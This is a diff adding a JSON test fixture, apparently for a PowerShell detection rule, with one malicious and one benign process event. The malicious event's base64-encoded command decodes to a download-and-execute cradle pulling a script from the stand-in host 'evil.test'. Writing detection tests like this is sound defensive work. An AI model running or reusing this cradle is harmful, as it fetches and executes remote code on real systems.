@@ -1,0 +1,8 @@
+{
+  "true_positive": [
+    {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBwAC4AcABzADEAJwApAA==", "User": "clinic-front01\\svc_temp", "ComputerName": "CLINIC-FRONT01"}
+  ],
+  "false_positive": [
+    {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\ProgramData\\Atera\\scripts\\patch_check.ps1", "User": "clinic-front01\\atera_agent", "ComputerName": "CLINIC-FRONT01"}
+  ]
+}
